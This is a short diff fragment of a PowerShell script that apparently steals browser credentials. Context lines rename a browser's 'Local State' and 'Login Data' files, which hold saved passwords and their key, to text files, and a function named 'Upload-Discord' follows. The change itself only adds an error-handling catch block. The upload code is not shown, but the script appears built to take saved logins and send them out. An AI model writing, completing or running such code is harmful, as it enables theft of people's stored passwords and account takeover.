@@ -25,6 +25,9 @@ try {
     Rename-Item -Path "$folderPath\Local State" -NewName "$folderPath\state.txt" -Force
     Rename-Item -Path "$folderPath\Login Data" -NewName "$folderPath\data.txt" -Force
 }
+catch {
+    Write-Host "An error occurred: $_"
+}
 
 ############################################################################
 function Upload-Discord {
